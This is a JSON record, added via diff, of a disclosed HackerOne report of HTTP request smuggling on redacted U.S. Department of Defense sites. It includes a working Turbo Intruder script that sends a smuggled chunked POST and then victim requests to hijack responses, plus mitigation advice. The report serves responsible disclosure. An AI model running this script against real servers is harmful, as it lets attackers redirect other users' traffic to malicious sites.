@@ -1,0 +1,142 @@
+{
+  "id": 526880,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjY4ODA=",
+  "url": "https://hackerone.com/reports/526880",
+  "title": "Request smuggling on ████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-04-04T14:55:55.466Z",
+  "submitted_at": "2019-04-04T14:55:55.466Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "albinowax",
+    "url": "/albinowax",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-08T18:42:20.348Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-08-10T02:12:24.022Z",
+  "team_member_agreed_on_going_public_at": "2019-10-08T18:42:20.220Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\n\n**Description:**\nThe sites at █████████ and ww.██████████ are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.\n\nThis vulnerability occurs because the backend server regards` \\n` as a valid header ending, whereas the backend only thinks `\\r\\n` is valid. This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.\n\n## Impact\nUnauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.\n\n## Step-by-step Reproduction Instructions\nTo replicate this with minimal risk of affecting legitimate users we'll target stage.████████ instead of ██████████, and use the following turbo intruder script:\n\nI've hard-coded the endpoint to ██████████ because it appears that you've got multiple endpoints for stage.█████████ and some are not vulnerable.\n```\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint='https://██████████:443',\n                           concurrentConnections=5,\n                           requestsPerConnection=1,\n                           pipeline=False,\n                           maxRetriesPerRequest=0\n                           )\n    engine.start()    \n\n    attack = '''POST /████ HTTP/1.1\nFooz: bar\\nTransfer-Encoding: chunked\nHost: stage.█████\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nFoo: bar\n\n0\n\nGET███████ HTTP/1.1\nX: X'''\n\n    engine.queue(attack)\n\n    victim = '''GET /foo.jpg?x=%s HTTP/1.1\nHost: stage.████████\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: keep-alive\n\n'''\n    for i in range(15):\n        engine.queue(victim, i)\n        time.sleep(0.2)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n\n ```\nYou should observe that one of the responses to a victim request is a 302 redirect to █████████\n\n## Suggested Mitigation/Remediation Actions\nWhen I resolve stage.███ I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:\n\n```\nstage.████████.\t\t59\tIN\tA\t██████████\nstage.████.\t\t59\tIN\tA\t████████\nstage.█████.\t\t59\tIN\tA\t██████\nstage.███████.\t\t59\tIN\tA\t█████\nstage.████.\t\t59\tIN\tA\t██████████\nstage.██████████.\t\t59\tIN\tA\t█████\n```\n\n## Impact\n\nUnauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 25,
+  "voters": [
+    "mashoud1122",
+    "address_below0",
+    "spam404",
+    "remonsec",
+    "mik317",
+    "0xelkomy",
+    "term1nal",
+    "naategh",
+    "null_rhythm",
+    "codeanddecode",
+    "and 15 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 18456,
+      "category": "researcher",
+      "content": "I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn",
+      "updated_at": "2019-10-11T08:54:25.418Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 56414,
+        "username": "albinowax",
+        "name": "James Kettle",
+        "bio": "@albinowax",
+        "cleared": true,
+        "verified": true,
+        "website": "https://jameskettle.com",
+        "location": "United Kingdom",
+        "created_at": "2016-02-15T11:34:15.992Z",
+        "url": "https://hackerone.com/albinowax",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    }
+  ]
+}
